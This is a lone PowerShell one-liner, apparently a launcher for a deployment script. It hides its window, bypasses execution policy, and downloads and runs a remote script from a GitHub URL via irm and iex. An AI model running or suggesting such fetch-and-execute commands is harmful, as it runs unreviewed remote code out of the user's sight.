powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "" iex "& { $(irm 'https://raw.githubusercontent.com/neztach/EmDeploy/main/powershell_Get.ps1') }" ""'}"